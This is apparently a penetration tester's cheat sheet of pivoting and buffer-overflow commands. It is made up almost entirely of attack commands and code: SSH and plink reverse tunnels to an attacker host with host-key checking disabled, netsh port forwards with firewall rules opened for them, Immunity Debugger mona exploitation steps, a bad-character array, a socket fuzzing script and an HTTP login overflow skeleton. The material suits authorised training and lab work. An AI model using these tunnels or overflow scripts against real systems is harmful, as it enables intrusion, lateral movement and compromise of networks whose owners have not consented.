ssh -N -R <ATTACKER-IP>:<ATTACKER-PORT>:<COMPROMISED-HOST>:<TARGET-PORT> kali@<ATTACKER-IP>
sean@sean: ssh <gateway> -R <remote port to bind>:<local host>:<local port>
ssh -f -N -R 222:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa

// DYNAMIC PORT FORWARD - PROXYCHAINS
ssh -N -D 127.0.0.1:9050 <USER>@<COMPROMISED-HOST>

// DYNAMIC REMOTE PORT FORWARD (OpenSSH8.1+)
ssh -f -N -R 9050 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@<ATTACKER-IP>

// plink.exe #SSH client for windows
systemctl start ssh.service
cmd.exe /c echo y | plink.exe -ssh -l kali -pw <PASSWORD> -R <ATTACKER-IP>:<ATTACKER-PORT>:<COMPROMISED-HOST>:<TARGET-PORT> <ATTACKER-IP>

// NETSH LOCAL PORT FORWARD
netsh interface portproxy add v4tov4 listenport=<LOCAL-PORT> listenaddress=<COMPROMISED-HOST> connectport=<TARGET-PORT> connectaddress=<TARGET-IP>
netsh advfirewall firewall add rule name="lcl fwd" protocol=TCP dir=in localip=<COMPROMISED-HOST> localport=<LOCAL PORT> action=allow

// NETSH REMOTE PORT FORWARD
netsh interface portproxy add v4tov4 listenport=<LOCAL-PORT> connectport=<ATTACKER-PORT> connectaddress=<ATTACKER-IP>
netsh advfirewall firewall add rule name="rem fwd" protocol=TCP dir=in localport=<LOCAL PORT> action=allow

##########################################################################
##							BUFFER OVERFLOW								##
##########################################################################
// BUFFER OVERFLOW COMMANDS
msf-pattern_create -l 4000
msf-pattern_offset -l 4000 -q 39794338
!mona modules
!mona find -s “\xFF\xE4” –m “<MODULE>”

// BUFFER OVERFLOW METHODOLOGY
# https://www.thecybermentor.com/buffer-overflows-made-easy
Steps:
	1. Crash The Application: Send "A"*<NUMBER>
	2. Find EIP: Replace "A" w/ pattern_create.rb -l LENGTH
	3. Control ESP: !mona findmsp (@crashtime), pattern_offset.rb, !mona pattern_offset eip
	4. Identify Bad Characters
	5. Find JMP ESP
	6. Generate Shell Code
Exploit

// BADCHARS
badchars = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

// IMMUNITY DEBUGGER MONA COMMANDS
!mona findmsp (find offset when app crashes)
!mona pattern_offset eip
!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin
!mona find -s "\xFF\xE4" -m <PROGRAM/DLL> 
!mona jmp -r esp
!mona jmp -r esp -cpb '\x00\x0a\x0d'

// BUFFER OVERFLOW FUZZING SCRIPT
#!/usr/bin/python
import socket
RHOST = ""
RPORT = ####
buf = "A" * 4000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))
print "Sending buf"
s.send(buf + '\n')

// BUFFER OVERFLOW OVER HTTP SCRIPT
excerpt 

		content = "username=" + inputBuffer + "&password=A"

		buffer = "POST /login HTTP/1.1\r\n"
		buffer += "Host: 192.168.139.10\r\n"
		buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
		buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		buffer += "Accept-Language: en-US,en;q=0.5\r\n"
		buffer += "Referer: http://192.168.139.10/login\r\n"
		buffer += "Connection: close\r\n"
		buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
		buffer += "Content-Length:  "+str(len(content))+"\r\n"
		buffer += "\r\n"

		buffer += content

		s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

		s.connect(("192.168.139.10", 80))
		s.send(buffer)

		s.close()

modify as needed